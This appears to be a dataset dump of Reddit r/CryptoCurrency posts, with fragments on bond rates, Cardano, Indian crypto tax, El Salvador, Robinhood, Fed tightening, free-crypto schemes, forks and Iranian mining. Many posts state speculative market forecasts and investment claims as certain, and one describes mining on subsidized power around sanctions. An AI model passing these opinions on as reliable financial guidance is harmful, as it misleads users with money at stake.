better sell now to front-run that', which is the main thing that *actually* causes stocks to fall when bond rates increase.How crypto will fare with increasing bond rates is unknown, because rates have been declining ever since BTC was born, until very recently. Personally, I imagine crypto will follow stocks down if rates go up too much, but nobody knows for sure.# Some historical contextUS bond rates hit an ATH in 1981 around 15% (edit: some sources seem to say 20%; unsure which is correct). Unsurprisingly, the stock market hit a low at the same time (like I said before, the orthodox narrative is that there is an inverse relationship between bond rates and most securities markets). Think about how ridiculous 15% bond rates are. That would mean you could buy what is definitionally the safest investment available and get 15% returns each year. By contrast, the safest stock ETFs (still way riskier than US bonds) average like 7% a year.So, in the 80s, you could double your money every 5 years while accepting what is usually considered 0 risk. Ever wonder why boomers seemed to get wealthy so easily? This is one of the reasons.Since the ATH in 1981, the treasury bond rate has fallen continuously until Covid hit, at which point it pivoted at a low of about 0.5%. Since then, it has been going back up, but is still extremely low, at around 1.5%.Since bond rates going down means stocks go up (at least, this is a very popular narrative, though some disagree), the stock market has been in a tremendous and arguably unnatural bull run for about 40 years, only pausing twice very briefly for 'corrections' circa 1999 and 2008.Since US bond rates have gotten so close to 0%, they can't really lower them any further without going negative (which is actually a thing, and some countries are trying negative interest now. This is an extremely weird rabbit hole that nobody really knows the true consequences of yet. Imagine getting paid to borrow money. Several countries have been experimenting with this over the last 7 years, and a few I believe for even longer). The chair of the FED (Jerome Powell) said a few months back that they have no intention of going to negative interest rates, so that means these past 40 years of propping up markets by reducing bond rates has probably come to an end.You could think of the continuous lowering of rates for the last 40 years as the FED spending its ammunition to prop up markets and propel economic growth, but now that rates are barely above 0% and the FED isn't willing to go negative, they are out of ammo. Not only are they out of ammo when it comes to lowering the rates, but one might also argue they are also currently incentivized to *increase* rates to combat rising inflation.This is why there is fear. The FED has been sticking its hands in for 40 years to prop up markets, and now it seems they are going to stop, at least for now.I hope this ~~ELI5~~ ~~ELI12~~ ELI-an-Intro-to-Econ student about why US gov bond rates are such an important concept for understanding global economics has been enlightening!",False,"A crash course on what changing the US bond rate means, and why it is considered such an important factor for US and global markets and economies",INACTIVE,262,6047,0.97,https://www.reddit.com/r/CryptoCurrency/comments/rxoj2i/a_crash_course_on_what_changing_the_us_bond_rate/,[]

That is why the most popular dApps are all currently comfortably situated on the Ethereum main network. Yes, Ethereum's price dumped during the bear market as well, but the OGs in the space and all of the developers kept their eyes laser focused on the development happening within the Ethereum ecosystem.I personally believe there are several solid alternatives to Ethereum (Polygon, Avalanche, Solana), but unless such networks have built a bridge to Ethereum, they likely will not survive. That is why all of the chains I mentioned were forced to develop bridges to Ethereum because no developer in their right mind would leave the Ethereum ecosystem for a risky sidechain or other layer 1 network. I do not think Cardano will be any different, but this is just my opinion.Unless someone can tell me otherwise, I am not aware of any actively used dApp that has committed to migrating from other chains to Cardano. Unless you see the likes of Uniswap, Aave, Compound, MakerDAO, Synthetix, USDC, and Yearn talk about migrating to Cardano, there really isn't anything to talk about with regard to 'Cardano killing Ethereum'. Hint: they'll never migrate.I'm posting this because I'm getting sick of the manic Cardano threads where bagholders are desperately trying to get others to buy so the price goes higher and they can sell. Yes, they are scheduled to release smart contracts soon, but the biggest question remains, ***who is going to use their platform***? I have seen extraordinarily innovative developments being made on Ethereum, Polygon, Avalanche, Solana, and those did not happen overnight and it's hard to imagine people just packing up their bags and leaving to work on Cardano.To all of the people about to yell at me for making another 'Cardano is overhyped post' I want you to take a good hard look at yourself in the mirror: have you ever actually *used* Ethereum? Polygon? Avalanche? Solana? Have you ever actually *used* a decentralized exchange, lending protocol, NFT marketplace/game, or provided liquidity to these networks? I have. I've done all of it. So do you really have the perspective to be arguing about 'Ethereum killers' and how 'great' Cardano will be when you don't even have experience with engaging and interacting with smart contracts?Where is all of your hype really coming from, the echo chambers on Twitter and Reddit? I'm asking because I fell for the same 'academic scientific approach' marketing in 2017 and it's just the same cycle over and over again - Cardano is great at making money during bull markets, but not very good at delivering promised products, but I really hope I'm wrong this time.!remindme 8 monthsEDIT: Maybe some users in the comment section can look at one another and realize that there is not a single rebuttal to my points (removed technical because one user is right, I didn't really provide 'technical' arguments). Every post is about price action. Will Cardano potentially make you some money this bull run? Sure, that is, if you aren't stuck holding bags while everyone sells the top. But please, let's stay on topic. Present some counterarguments related to the actual utility of the network.EDIT 2: People should be aware that there was very similar hype surrounding Cardano leading up to the Coinbase [listing date](https://blog.coinbase.com/cardano-ada-is-launching-on-coinbase-pro-694b1cb8c778?gi=2495f7011d1c) (March 16-18), and the hype pump peaked at 1.38 (ATH at the time) on March 17, dumped to 1.24 (-10%) by March 18, and continued to dump to 1.06 (-25%) by March 24. Sure, it kept going up, and we may see a similar 'pump, dump, pump' related to the smart contract release, but the 'pump' following the 'dump' all depends on execution and whether people actually care to use Cardano's platform.EDIT 3: Thanks to a great comment by u/BornToBeHwild, I learned that Cardano is already developing and supporting an Ethereum bridge ([https://iohk.io/en/blog/posts/2021/05/17/bringing-erc20-to-cardano/](https://iohk.io/en/blog/posts/2021/05/17/bringing-erc20-to-cardano/)), which proves my point entirely - Cardano won't 'kill everything in this space', they are already building measures to integrate with the existing ecosystem and adapt, so maybe it's time to stop saying it will end all of the progress that has already been made in decentralized finance and media and take over the world.EDIT 4: I realize that my post is very triggering and I will edit the language a bit to emphasize the points I'm trying to make and remove some of the more triggering elements. Sometimes you forget in all of the mania that people have money at stake and I by no means am trying to 'FUD' Cardano. I have friends and family who own this coin and I actually like Charles as he introduced me to a lot of the concepts I learned about in this space through his videos and lectures. I hope Cardano succeeds.The point of my post was that people need to understand there already a ton of great, functioning products out there that all promised similar 'Ethereum killing' capabilities that ultimately had to adapt and integrate with Ethereum in order to remain relevant and I do not think Cardano will be any different (see EDIT 3). Just trying to set expectations, especially for newcomers who are probably feeling FOMO for Cardano and are tempted to buy it while it's up x2 it's 2017 ATH and at the peak of its bull run. I'm not saying it won't go higher, but I do think the mania can be harmful for people who are just getting into the space now.EDIT 5: I want to bring attention to a [comment](https://www.reddit.com/r/CryptoCurrency/comments/p95p41/for_those_of_you_who_werent_here_during_the_bear/h9vgije?utm_source=share&utm_medium=web2x&context=3) in this thread made by u/Bwahehe, which is not getting enough upvotes and perfectly articulates the point I am getting across:>ETH is like Manhattan. Horribly crowded with insane traffic, but they're doing a ton of business.  >  >Cardano is like someone selling a potentially lucrative spot of land but absolutely no businesses are there yet. They promise that they'll finish the roads in a month or two but they'll be some damn amazing and scientifically proven roads.  >  >Most up and coming smart contract coins promise massive highways and roads but nobody knows if the roads and bridges are really safe to drive on and only hydrogen powered vehicles approved by them are allowed on the roads.EDIT 6: I'm trying to respond to everyone but this is exploding... Also, I keep getting accused of 'missing' Cardano or 'buying it high' or something. Guys, look at my username. [I'm all about The Graph](https://www.reddit.com/r/CryptoCurrency/comments/owryqy/why_the_graph_grt_also_known_as_the_google_of/) (GRT).EDIT 7: I've been reading more and being a bit more selective about commenting back since there are just too many to keep up with and every time I refresh there's 50 more, but I'm really happy to see that the comments have shifted from price to actual discussion. Great to see! This is what r/CryptoCurrency should be all about! I like ADA, I like Charles, I want it to succeed for reasons I mentioned above.This isn't meant to be a tribalistic war-igniting trigger post. I just think it's time to have real discussion on this sub and Cardano is the hottest topic because it is leading the bullrun in gains. Stop getting so bent out of shape, my post is not going to cause Cardano to dump, nor is it an attempt to provoke a dump. I think this is a great place for newcomers and old schoolers to join one another and discuss what they know. It's also a great opportunity for Cardano followers and supporters to counter my arguments and present their points and why they believe in the project - remember, I have not really kept up with Cardano since 2017, so I can totally be wrong about a lot of things and I accept that! The point is, this thread was a success because it reminded thousands of users here that we can still engage in high level discussions and not everything has to be about price and driving lambo rockets to the moon.Just want to thank a few posters for their great comments including  u/orangeblack07 ([here](https://www.reddit.com/r/CryptoCurrency/comments/p95p41/for_those_of_you_who_werent_here_during_the_bear/h9vtoat?utm_source=share&utm_medium=web2x&context=3)), u/todayismycheatday ([here](https://www.reddit.com/r/CryptoCurrency/comments/p95p41/for_those_of_you_who_werent_here_during_the_bear/h9vsq6t/?context=3)), u/cali_dave ([here](https://www.reddit.com/r/CryptoCurrency/comments/p95p41/for_those_of_you_who_werent_here_during_the_bear/h9vogw9?utm_source=share&utm_medium=web2x&context=3)), u/OhIamNotADoctor ([here](https://www.reddit.com/r/CryptoCurrency/comments/p95p41/for_those_of_you_who_werent_here_during_the_bear/h9vnxer?utm_source=share&utm_medium=web2x&context=3)). There are so many great comments, but as you can imagine, my inbox is absolutely obliterated and I need to go to sleep lol, so give these guys the upvotes they deserve!EDIT 8: Last edit (I hope). Some great discussion ultimately ensued and I appreciate everyone who made thoughtful posts. I definitely don't appreciate the attacks on my character and assumptions about who I am as a person, but I guess that's part of making controversial posts like this. Had no idea it would blow up so much and did my best to answer as many comments as I can. I really hope everyone knows that I do like ADA, I do like Charles, and I hope Cardano succeeds (though I think I've already mentioned this in another of my 45 edits). I was just hoping to stimulate some actual discussion on a subreddit that is in dire need of it. Thanks for engaging me. Till next time!EDIT 14: Lots of great comments actually made me realize I don't know the first thing about what is going on with Cardano at this point in time, I'm not ashamed to admit it. There's a lot more going on than I thought there was! I listed some of the good comments that pointed me in the right direction above in EDIT 6. Maybe I'm wrong about Cardano, maybe the slow and steady wins the race philosophy will prevail! Who knows. I'm just glad that there were so many newly introduced perspectives in this thread hidden between the shill and anti-graph'_marine brigading. I'll be eagerly awaiting the launch of their smart contract platform and dApps so that I can dabble with them myself.Thanks again to everyone who provided quality discussion and also to anyone who gave me awards, you really didn't have to do that!tl;dr (for those who want one) - Cardano has taken a very long time to release a product while others have thrived. People only seem to talk about Cardano during bull markets when the price is going up and I want to have a discussion about how people can think it is the end-all-be-all smart contract platform when it still doesn't have a working product.

This is the first time the Indian government is discussing crypto taxation. The tax will apply to all gains on digital virtual assets, and no capital losses will be allowed. Business expenses will also not  be allowed.Gifts in the form of digital currency will be also taxed in the hands of the receiver.This is a landmark announcement as the first time the Indian government is announcing any law or regulation around crypto. So far nothing concrete was announced except rumors in the media. Now crypto being a taxable asset will lead to growth of adoption of crypto in India> I propose to provide that any income from transfer of any virtual digital asset shall be taxed at the rate of 30%. No deduction in respect of any expenditure or allowance shall be allowed while computing such income, except cost of acquisition: FM Nirmala SitharamanEdit : Some sources are saying capital gains losses is not allowed only for offsetting it with other income sources. But it is still allowed within crypto. Waiting for more clarity on this.Edit 2: ~~It seems completely no capital losses.~~ https://www.indiabudget.gov.in/doc/memo.pdfLaw mentions 'aggregate income from crypto transfers' - some seem to think this means crypto losses can be offset among crypto itself. > However, no deduction in respect of any expenditure (other than cost of acquisition) or allowance or set off of any loss shall be allowed to the assessee under any provision of the Act while computing income from transfer of such asset> Further, no set off of any loss arising from transfer of virtual digital asset shall be allowed against any income computed under any other provision of the Act and such loss shall not be allowed to be carried forward to subsequent assessment years.Edit 3: Most reaction seem to suggest 30% is really harsh. Especially when long term capital gains from stocks is like 10%. 30% will apply for developers and builders too, which will mean they will move to friendly tax jurisdictions rather than remain in India. Seems like a dumb and self defeating policy tbh.The law taxes not profits but even transfers. So even simple actions like staking or moving funds or using a smart contract would become taxable. This is insane. Projects that originated in India like Polygon are already moving out, experts say most crypto companies will follow suit as a crypto native company doesn't want to deal with 30% tax for every transaction they makeTaxation is at 30% of gains if you are investing. If you are earning 100% of your income through crypto (lots of Indian freelancers/developers are, the tax will be at 30% of total income, which is definitely harsh)Edit 4: CEX like WazirX and CoinDCX will now automatically report trades to the tax authorities as TDS. This is similar to other TDS tax deducted at source policies.  So if you are using them the gov will now automatically find out about your trades. While the tax provisions are definitely bad for Indian users, it creates clarity so now some rich guy with a few millions to spare who was interested in crypto, but waiting on the sidelines wondering if it will be totally prohibited or not can start investing as they know its not prohibited but taxed heavily. Could lead to more Indians getting in (i.e. Le india pamp)**TLDR: Govt is taxing all crypto transactions including simple transfers at a flat 30% tax. No capital losses or business expenses allowed. In the same day, govt reduced corporate taxes to lowest in Asia, and offered loan and debt waivers for corporates. Fuel prices are soaring. There is literally nothing in this budget if you are middle class common person. If you run a billion dollar company, well there are few sops in it. Someone earning their income through crypto will get shafted. Massively anti-poor/anti-middle class, pro-elites, pro those who fund this sham government headed by dictator Modi. Honestly, fuck this..

He recently bought the dip. [However as the dip dipped, he has changed his profile picture. ](https://preview.redd.it/goninpvicdd81.jpg?width=1400&format=pjpg&auto=webp&s=5dac20d1b67f6706d4bc173e3858a6e6e7c043c8)Atleast he is owning it. Though some will say its not his money, its his country's money, but a lot of El Salvador's economy now depends on Bitcoin - from volcano mining, and now their bitcoin bonds that are going to be issued for raising funds after El Salvador showed the finger to IMF. Some people take hard and painful decisions in these times, that can cause pain to family and friends. Its worth remembering that money is not everything. If you have lost an obscene amount of unrealised gains, its best to make peace with it than to keep beating yourself up over it.Edit: LOL so many people embarrassing themselves and crying in comments. Looks like after this crash, a sense of humor is out of their budgetEdit 2: The hot takes here from a lot of trolls coming in from other subs like r/technology are ridiculous. Let El Salvador/Bukele do what he wants to do, give him the time to decide if the experiment has failed or not. If it fails, so be it. I mean thousands of government policies have failed. He isnt buying BTC to get rich over night. Its a long term policy decision for him. While you claim he is wasting tax payer money, he is actually putting his reputation on the chopping block here, which is more than anything you can claim. If his economy collapses, its gonna be him on the opposite end of a coup or worse. That country is no stranger to presidents being overthrown in violence.All the big brains here concerned about El Salvador's economy imploding all of a sudden, where were all of you 3 years ago when the nation was just the same, warn torn and filled with cartels? You didnt care then when the past presidents over ran the country with gang violence? Oh yeah, you didnt even know the country existed. Now that they are trying something new with BTC, it suddenly hurts your feelings so much. El Salvador have already started mining BTC from volcano energy that was being wasted, it represents a completely new income stream in a country that mainly depends only on tourism and remittances. Many reports already suggest the locals are able to save middle men fees by using BTC, while kicking out predators like Western Union. He has kicked IMF out, American media will do everything to portray him in a bad light and all you will parrot what you read in the media. Where were you guys when US Fed doubled the supply of USD in 1 year, printing relentlessly while other countries that depended on USD had no way to print any USD and had to bear the brunt of rampant inflation as they were hopelessly tied to USD? Of course, you never bothered to find out the reality of whats going on in other countries that used USD, while the Fed inflated it away. Now that he is trying something new to pivot away from BTC, and its not even been a year into a long term project, but you are ready to pass your judgements. Just a standard bunch of hypocrites.

Last night I finally received word that my wallet was ready. **As of this morning the remaining assets I has hodling have been transferred OUT!**Screenshot: [https://imgur.com/a/unzF2sS](https://imgur.com/a/unzF2sS)**I STRONGLY urge you to do the same if you have not done so already.** It's worth the gas price too ([which is a little lower than normal right now](https://ycharts.com/indicators/ethereum_average_gas_price)). If you've quietly been waiting for your Robinhood crypto wallet, it should come soon. I was around number 55k in line to receive mine.*Why transfer out?* If you're not aware, Robinhood restricted trades during the the GameStop/meme-stock mania last year which effectively helped shady hedge funds and hurt regular folk like you and I ([see more about that here](https://www.cnet.com/personal-finance/investing/robinhood-backlash-what-you-should-know-about-the-gamestop-stock-controversy/)). They were also fined $70M by FINRA over other shady practices, including having 'outages' during big market swings between 2018 and 2020 ([check that out here](https://www.nytimes.com/2021/06/30/technology/robinhood-fined-misleading-customers.html)). This was especially a frustration last year when Robinhood suddenly suffered 'technical difficulties' during the epic Doge runup ([more info here](https://www.theverge.com/2021/5/4/22419159/robinhood-dogecoin-outage-crypto-trading-crash#:~:text=Robinhood%20confirmed%20that%20it%20experienced,the%20beginning%20of%20the%20day)). So then, it's pretty clear that Robinhood's interests are NOT with you. **Why trust them with your assets when they block you from making financial decisions during critical market movements?**I'm not the only one in this sub that is alarmed by Robinhood, please see these additional posts and comments from our fellow sub-mates for more information so you can make your own decision:* [Robinhood CEO can't/won't answer questions](https://np.reddit.com/r/CryptoCurrency/comments/lmyhur/for_those_still_on_the_fence_with_robinhood_watch/)* [Citadels CEO Lied Under Oath about a Collusion with Robinhood](https://np.reddit.com/r/CryptoCurrency/comments/pw0kgt/leaked_documents_show_that_citadels_ceo_lied/)* [Robinhood locked the buy button when it suited them](https://np.reddit.com/r/CryptoCurrency/comments/lfrslo/reminder_robinhood_blocked_several_stocks_from/)TLDR: I finally moved all my crypto off Robinhood now that they enabled my crypto wallet.

For example the average fees for moving out ETH is 0.02 ETH (~$35) sometimes this is the amount most people have. Similar example can be applied to other coins as well. Another point is that exchanges are not un-secure anymore. They will store coins with high security measures. And you should enable things like 2FA to keep your account even more secure.

The boom of dogecoin and it's peers have just added fuel to the sale of memecoins which are often scams or rugpulls. Even if they aren't, that doesn't mean it's a good investment.The value and room for growth of any Cryptocurrency is determined by it's Marketcap. The market cap of a token is calculated by multiplying the value of one coin into the total supply of the coin.If a coin has the value of $0.0001 a piece and the market cap of $100 billion and you buy a million tokens thinking it'll make you a millionaire someday, you are WRONG!This token will NEVER go to $1. For it to reach $1 the market cap of the crypto would have to be $1 Quadrillion Which is IMPOSSIBLE! Even Bitcoin, the OG, doesn't have that marketcap. That being said, while checking the marketcap is important,if the token is deflationary you should check the minimum supply it will have in the future and then calculate it's highest possible growth.If there is something I need to add or correct, please comment it.Edit: Market capitalisation is obviously not the only criteria which can help us determine how much a coin's value can grow, but it is a good place to start. There are plenty other things such as total supply and max supply of tokens, fully diluted market cap, volume etc. One should always read the token's whitepaper to find all the details, check social media handles of the dev team and the official handle of the token (if they have any).",False,Just because a coin's value is $0.00001 doesn't mean it has room to reach $1,u/[deleted],53,5352,0.88,https://www.reddit.com/r/CryptoCurrency/comments/rd3hkt/just_because_a_coins_value_is_000001_doesnt_mean/,[]

Why not spend a little more time paying attention to the economy in the short-term, so you can make proactive decisions about your investments? Here's a bit of reality for all you genius apes.  The fed meeting is tomorrow and its going to be a .75 basis point hike.  First time since 1994.  Some of this is already baked into markets (I'm assuming you've realized by now that your stocks are down almost 10% and crypto is down 30% since Friday), but there is always more room to drop and more pain to come. A lot more.  When JP pulls a switcheroo from .5 to .75 a mere 36 hours before the Fed meeting, you had better bed your ass that he'll open up the doors for more hikes at .75.  And he should.  A CPI at 8.6 is bonkers with a base funds rate of 1.5%.  It's borderline economic catastrophe.  Since the invention of the dollar, rate hikes have only successfully brought down inflation once they got within 2.5% of the inflation rate.  Get your calculator out bc that means if the inflation rate were to stay at 8.7 (yea right) it would take 6 more rate hikes to get us in the functional range. When he says that 'we are now considering .75 rate hikes in July and September, possibly higher' you had better believe people are going to trade whatever they can for cold hard cash.  And that's not all.  You've probably heard of Quantitative 'Easing'.  That's how the Fed 'prints' money into existence. They create the money on a magic computer and use it to purchase treasuries and mortgage-backed securities (those bundles of mortgages you heard Christian Bale and Steve Carrell talking so much about in The Big Short).  The Fed bought 3 boatloads of this stuff in 2008 (these purchases are referred to as the 'bailouts'), and up to now they've got about $8,500,000,000,000 worth.  That's trillion, with a T. Now we get to play a new game.  Quantitative 'Tightening'.  Starting tomorrow (Wednesday for anyone late to the party), the Fed will sell $45,000,000,000 in assets onto the open market.  That's going to be a whole lot of pressure on markets to stay up and we all know people aren't exactly buying-hand-over-fist right now.  Their purpose is to bring markets down.  That, by definition, is fighting inflation.  Remember: price up = bad.  Price down = good.  But the QT fun doesn't end there.  The Fed is going to sell another $45 billion in assets in July, and another $45B in August.  Then, they will increase the rate to $95 BILLION EVERY MONTH starting in September.  At that rate of monthly selling they won't run out of MBS for 7.5  years.  Let's talk about those mortgage-backed securities for a second. Those bundles of thousands of mortgages we call MBS start out when you buy a house. Or when your cousin buys a condo to rent on Airbnb.  Remember when you finally closed on your house and 2 days later you received a letter saying that your loan was purchased by another lender?  'Underwriting' is your lender making sure there is a buyer ready and willing to buy this loan the moment you close on the property.  That's why you get the notice right away.  As you were figuring out to whom you should make your mortgage payment that new lender was bundling your loan with many others to sell yet again to a bigger bank.  The bundle grows each time and at some point they refer to them as MBS, and for some reason they are considered much more secure than individual mortgages.  They are given ratings like A, BB, CCC, etc.  Picture Ryan Gosling playing jenga.  Now when the biggest MBS customer not only stops buying but starts dumping MBS onto the market, you can imagine the demand for these bundles of joy will shift.  Soon smaller banks can't sell to bigger banks as easily as before. And eventually not at all.  This past Friday the market for MBS actually hit 'zero bids' for the first time since 2008 (you might have seen a tweet from the actual Michael Burry).  As loans become harder to sell, will also become harder to write.  And we know what that will do to the housing market.  Remember: price down = good.  Now you're getting it.  Lastly, because my legs are asleep, you need to understand that most of the money that came into crypto since 2017 was not from people here on reddit.  Many of them do not share your diamond hands conviction, and their crypto investment doesn't represent an 'inflation hedge'.  It represents the riskiest thing they've ever done with their money.  Ever. Big risk = big reward.  And when both the stock market and the housing market get tumultuous, risk assest get sold first.  That is what you are starting to see. An almost perfect correlation between crypto and the Nasdaq, just where the swings in crypto gains and losses are exaggerated. Unfortunately we are probably one or two cycles away from certain cryptos being seen and used like the scarce resource inflation hedge that they really are.  So here you are, with all this new knowledge and a bag of Shitcoin Potpourri.  And there is a train coming tomorrow that will last until at least through September.

They can be free or they might require holding certain tokens or doing small tasks.Airdrops happen on many different platforms and for many different coins, so it's often hard to find them if you aren't familiar with the community or the platform. Anyway, [Airdrops.io](https://Airdrops.io) is a good website that gathers the best airdrops happening.&#x200B;**Bounties '[various cryptocurrencies']:**In the crypto world, it is a marketing strategy where an ICO allocates a percentage of their tokens for bounties. These are tasks that are open to the public to complete and their reward is the new token that is launching. Once the token is launched, participants of the bounty will receive their tokens. As you may have noticed, they're similar to airdrops. As airdrops, it is often difficult to find them. [This](https://beta.bounty0x.io/explore) is a good website that gathers some bounties that are currently active.&#x200B;**WeNano '[NANO']:**This is one of my favorites, so I encourage you to check them out since the project is awesome.Have you ever played Pok√©mon Go? Well, this is a similar app, but instead of capturing Pok√©mon, spots are created by users around the world, and by visiting them you can earn NANO and chat with other users. The payouts are actually really good, especially in large cities, and the community around it is awesome.[This](https://www.wenano.net/) is the official website (it's available both for Android and iOS)&#x200B;**NanoQuakeJs '[NANO']:**Another favorite of mine. It's literally just Quake 3, on your browser, and for each kill you get some NANO. I challenge you to find something cooler.[This](https://nanoquakejs.com/) is the website, you just need a nickname and a NANO address and you're good to go!There are some other similar projects, one of which is [PlayerKillers](http://playerkillers.exchange/), but I mean, Quake is Quake.&#x200B;**Reddit '[MOON, DOGE, NANO']:**Yeah, Reddit. There are actually a couple of ways to earn crypto on Reddit.First, our favorite, MOONs. You just need to set up your vault (on the app) and you're ready to receive moons next distribution! They happen once a month, and a fixed amount of moons are distributed to the r/CryptoCurrency community, based on the Karma you gained that month. So start shitposting!Other subreddits, like Dogecoin's and Nano's have bots that allow you to tip users, so if you make a good submission there you'll probably receive some coins from kind redditors. Also, subs like r/dogecoinbeg exist, where you can... Well... Beg for dogecoins.&#x200B;**Publish0x '[ETH']:**This is a really cool project that I personally love. It is basically a website like Medium, where users can post blog entries.The best thing about this is that the website provides the coins. You will literally earn crypto just by reading content on the website (which is crypto-related), sharing content and writing it (although you'll need to apply as an author to do so).[LINK](https://www.publish0x.com/)&#x200B;**SteemIt '[STEEM']:**Steemit is a blogging and social media platform that uses blockchain technology and a cryptocurrency to reward its users for creating content, commenting, and upvoting other posts.¬† It is really similar to Reddit, [here](https://steemit.com/)'s the link[Cent](https://beta.cent.co/~discover/) is another similar social network built on top of Ethereum, worth checking out.&#x200B;**NFT marketplaces '[various cryptocurrencies']:**Many websites offer the possibility to sell artworks, collectibles and in general NFTs. NFT, for the newcomers, stands for Non-Fungible Token, and means a token representing something unique. You can think of it as an art piece: although you can copy it, scan it and print it, there will only be one original copy. NFTs are used to verify and confirm the uniqueness of something and its ownership. So, let's say I make a beautiful digital painting, I can 'link' it to this token and whoever owns the token, owns the digital painting and can therefore sell it or trade it.[KnownOrigin](https://knownorigin.io/), [Mintable](https://mintable.app/), [Rarible](https://rarible.com/) and [OpenSea](https://opensea.io/) are all great example of such marketplaces. If you're a creative person and want to sell some of your works, those are great places to do so. &#x200B;**Games and Collectibles '[various cryptocurrencies']:**Many games run on a blockchain, using NFTs to create unique and rare in-game assets. Think of a card game like HeartStone: on the blockchain, it is possible to create only 10 cards of a specific type (using NFTs), so only 10 users in the world can own that card, so that card would extremely rare and therefore valuable.Usually, it is not easy to earn crypto this way, you'll need to play a bit before getting some good stuff that you can sell, but if you find a game that you like you can surely earn while having fun!Examples of games are [MyCryptoHeroes](https://www.mycryptoheroes.net/home), [EverDragons](https://everdragons.com/), [Axie Infinity](https://axieinfinity.com/), [Decentraland](https://decentraland.org/) and [Brave Frontier Heroes](https://bravefrontierheroes.com/).Some aren't even games at all, just collectibles that you can buy, trade and earn. Examples are [CryptoKitties](https://www.cryptokitties.co/catalogue) and [Clovers](https://clovers.network/)&#x200B;Endnote: especially services using NFTs on top of Ethereum are, right now, subject to really high fees that make it often impossible to trade these tokens effectively. Be careful when doing a transaction.&#x200B;&#x200B;EDIT:Some I forgot or didn't know about:* **Brave browser**: allows you to earn BAT just by browsing and seeing ads. Both on PC and mobile.* **ethtrader and fortniteBR**: they're also subreddits with a governance tokens (like moons), so you can earn some money shitposting there too.",False,A collection of all the possible ways to earn free Crypto,INACTIVE,349,5271,0.97,https://www.reddit.com/r/CryptoCurrency/comments/llyq6e/a_collection_of_all_the_possible_ways_to_earn/,[]

Generally, after a short time, those on the old chain will realize that their version of the blockchain is outdated or irrelevant and quickly upgrade to the latest version.&#x200B;[Hard Fork Illustration ](https://preview.redd.it/uu6wwcd8rpd71.png?width=3024&format=png&auto=webp&v=enabled&s=385ef57a88d19ff95fc602860be6433f9d5f02d9)In a hard fork, holders of tokens in the original blockchain will be granted tokens in the new fork as well, but miners must choose which blockchain to continue verifying.A hard fork can occur in any blockchain even Bitcoin (where hard forks have created Bitcoin Cash and Bitcoin SV, among several others or Ethereum classic from a previous upgrade)**'Well if there's a hardfork isn't there also soft fork?' Yes that's exactly right.**Hard forks and¬†soft forks are essentially the same in the sense that when a cryptocurrency platform's existing code is changed, an old version remains on the network while the new version is created.With a soft fork, only one blockchain¬†will remain valid as users adopt the update. Whereas with a hard fork, both the old and new blockchains exist side by side, which means that the software must be updated to work by the new rules. Both forks create a split, but a hard fork creates two blockchains and a soft fork is meant to result in one.¬†For example, a block size *decrease* can be implemented by soft-forking. However, doing so doesn't automatically disconnect you from the network. You still communicate with nodes that aren't implementing those rules, but you filter out some of the information they pass you.Edit:  This hardfork requires **no action** for anyone who is holding ETH (Except for node operators). You can keep your Ethereum where it currently is.

Cryptocurrency has changed the dynamics in Iran. The Iranian government's view on it has been quite lax compared to neighboring countries or other Muslim countries. There was either support for it or it was simply ignored since you couldn't really spend it on anything. On top of that, given the fact that Iran is disconnected from international banking, there was less concern from Iranian banks. (A bit ignorant, but I am not complaining)But things have changed drastically over the past few years. The increased sanctions and COVID have brought a lot more people towards crypto, including me. Crypto has a very unique situation in Iran, which I will try to explain briefly. The Iranian currency is currently the cheapest in the world (or one of the cheapest, as its unstable and can change daily). So if someone can earn dollars and spend it in Iran, they are going to profit a lot. We are talking close to 25x increase. This makes mining insanely profitable. Because you are going to pay for your electricity in Iranian currency, but you are earning dollars, because crypto exchange rate is based on western currencies, not Iranian. So electricity is dirt cheap to begin with, but you can get it even cheaper.There are ways to get free electricity in Iran. The government subsidizes businesses that have high electricity usage, so they get publicly funded electricity. So the owner of these businesses makes deals with individuals to buy hardware needed to mine currency (because the initial cost is very high due to currency difference), and usually one person with contacts overseas becomes the 'broker' to be able to turn these cryptos into tangible money.  People without these businesses tend to form mining communities where they work together to discreetly mine and turn crypto into actual currency and due to the fact that a lot of people are dealing in crypto now, you can actually find a lot of buyers locally, and don't even need to sell it to foreigners.So, this way crypto got introduced into society and a lot of people use it. Usually not as an investment, but as a currency you use to spend on things. Because in order to make an international purchase, you need to abuse a lot of loopholes, such as VPNs, middlemen and exchange rates. But now I can simply buy steam gift cards with bitcoin and use them to buy games. This applies to any international purchase. 60$ games used to cost a fortune, like an entire minimum wage income in Iran. Now they are widely available if you have crypto.The usual mishandling of the Iranian government in regards to the economy is bad enough, but in recent years sanctions and COVID have made it a three way hell. My life personally was hell because I could not make any international purchase and I could barely make ends meet. Crypto is so empowering. I am basically able to earn and spend money despite the efforts of both Iranian and American governments. In order to put things in perspective,¬†I can use myself as an example. I am a lawyer and I earn more money from mining that I do practicing law. I am still working,¬†but crypto is a great secondary income which I can use to make international purchases without having to pay half of my income for a 100$ purchase. We are still in bad conditions, but crypto provides a lifeline. At least for now.I am grateful for cryptocurrency and this community, because the livelihood of many people in Iran relies on crypto and information about it. Most people involved in crypto trade in Iran don't even speak English, but know that an entire country is thankful for it, and the value of crypto could not be clearer. An entire people neglected by their own government and sanctioned by half the world, left to basically starve and live in terrible conditions, continue to go on. In large part, thanks to crypto currencies. We practically have the power to defy the strongest governments in the world, the next step is THE MOON.Feel free to ask any questions.",False,"As an Iranian, Crypto has changed the life of Iranians for good.

For those who are out of the loop, a moonshot is something that has a low probability of becoming extremely successful '[1'].While it's definitely nice to be the guy who made the correct play, what I wanted to understand is, how likely are you to pick the next big coin? After all, there are more than [2,400 dead coins](https://www.coinopsy.com/dead-coins/#other) that were part of someone's moonshot not that long back. When a coin is dead, we would end up losing almost 100% of the capital that we invested in it thereby breaking the cardinal rule of investing.>*Rule No. 1: Never lose money. Rule No. 2: Never forget rule No. 1 -* ***Warren Buffet***While Warren Buffet might not be the best example for the crypto world, his advice holds true just as well in all investing spaces - Once you lose your capital, it's game over. So in this deep-dive, let's see how the less popular cryptos have performed over the years, whether it makes sense to invest in them, and finally, would you have made better returns just by investing in the top cryptocurrencies like Bitcoin and Ethereum?!### Data & Analysis MethodologyAll the data used in the analysis has been collected from coinmarketcap.com. Their data is available going as far back as 2014. I collected the price, market cap, and the symbol for all the coins listed in coinmarketcap on Jan 1st of every year from 2014 to 2022. There were only 67 listed coins in 2014. The list has grown to more than 3,000+ as of Jan 2022. All the data and my analysis are shared as a Rows sheet at the end.The analysis is fairly simple and I have intentionally made the strategy straightforward so that it's easy to replicate. We will be comparing the performance of the Top 10 Cryptocurrencies with the next 90 based on the total market cap of the coin.[The end of 2017 was definitely some wild time to be in the Crypto 